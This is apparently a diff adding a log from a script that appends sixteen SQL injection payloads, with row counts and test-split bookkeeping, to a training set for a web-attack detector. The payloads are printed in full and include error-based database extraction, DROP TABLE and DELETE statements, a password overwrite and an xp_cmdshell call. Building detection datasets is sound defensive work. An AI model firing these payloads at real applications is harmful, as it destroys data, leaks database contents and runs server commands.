@@ -1,0 +1,30 @@
+=== Train-only addition: missing SQLi payload pool indices 25-40 ===
+sqli_payload_pool.csv total payloads: 41
+payload indices already present in augmented_web_attack.csv: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24]
+missing indices added by this script: [25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40]
+
+  idx=25 family='Error-based' payload='updatexml(1,concat(0x3a,(select database())),1)'
+  idx=26 family='Error-based' payload="'||(select user)||'"
+  idx=27 family='Error-based' payload='AND 1/0'
+  idx=28 family='Error-based' payload='SELECT * FROM users WHERE 1=convert(int,(SELECT top 1 name FROM sysobjects))'
+  idx=29 family='Error-based' payload='SELECT CAST(database() AS int)'
+  idx=30 family='Error-based' payload='SELECT @@version'
+  idx=31 family='Error-based' payload='EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))'
+  idx=32 family='Stacked/other' payload='1; DROP TABLE users; --'
+  idx=33 family='Stacked/other' payload="'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%'"
+  idx=34 family='Stacked/other' payload="'; DROP TABLE users; SELECT * FROM customers WHERE name LIKE '%'"
+  idx=35 family='Stacked/other' payload="'; SELECT * FROM users WHERE 'a'='a"
+  idx=36 family='Stacked/other' payload="'; EXEC xp_cmdshell('dir');--"
+  idx=37 family='Stacked/other' payload="'; DROP TABLE sessions; --"
+  idx=38 family='Stacked/other' payload="' ; UPDATE users SET password='x' --"
+  idx=39 family='Stacked/other' payload="1; INSERT INTO users(name) VALUES ('hacker');--"
+  idx=40 family='Stacked/other' payload='1; DELETE FROM users;--'
+
+rows per payload: 400 (matches density of the 25 payloads already present)
+new rows appended: 6400
+dataset rows before: 32195
+dataset rows after:  38595
+
+source='sqli_pool_extra', source_uid='sqli_pool_extra_<payload_idx>_<seq>' -- new values,
+cannot collide with any existing source_uid, and (being appended past the frozen
+30084/32195-row range) automatically fall outside data/test_split_indices.pkl's test_idx.
